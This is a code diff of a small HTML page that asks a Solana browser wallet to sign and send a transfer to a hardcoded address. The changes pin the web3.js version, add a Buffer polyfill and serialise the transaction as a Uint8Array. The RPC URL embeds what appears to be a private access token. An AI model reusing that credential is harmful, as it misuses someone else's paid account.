@@ -10,11 +10,13 @@
     <p id="wallet-address"></p>
     <p id="transfer-status"></p>
 
+    <!-- 引入 Buffer polyfill -->
     <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.32.0/lib/index.iife.min.js"></script>
 
     <script>
+        // 将 Buffer polyfill 添加到全局 window 对象
+        window.Buffer = buffer.Buffer;
 
         let walletAddress = null;
 
@@ -35,7 +37,6 @@
 
         document.getElementById('transfer-button').addEventListener('click', async function () {
             if (walletAddress) {
-                // 使用官方 RPC URL
                 const connection = new solanaWeb3.Connection('https://wider-hidden-water.solana-mainnet.quiknode.pro/c3838343ee4b4b0cd29386396f778fd5e5463f55/', 'confirmed');
                 const fromPubkey = new solanaWeb3.PublicKey(walletAddress);
                 const toPubkey = new solanaWeb3.PublicKey('9GutCi1jKvRTDBmF4kjJRxubc7LqrHYQKYThZbiHMNAw'); // 替换成目标钱包地址
@@ -61,7 +62,10 @@
 
                     // 签署交易
                     const signedTransaction = await window.solana.signTransaction(transaction);
-                    const signature = await connection.sendRawTransaction(signedTransaction.serialize(), { skipPreflight: false });
+
+                    // 使用 Uint8Array 代替 Buffer.from
+                    const serializedTransaction = new Uint8Array(signedTransaction.serialize());
+                    const signature = await connection.sendRawTransaction(serializedTransaction, { skipPreflight: false });
 
                     // 等待交易确认
                     await connection.confirmTransaction(signature, 'confirmed');
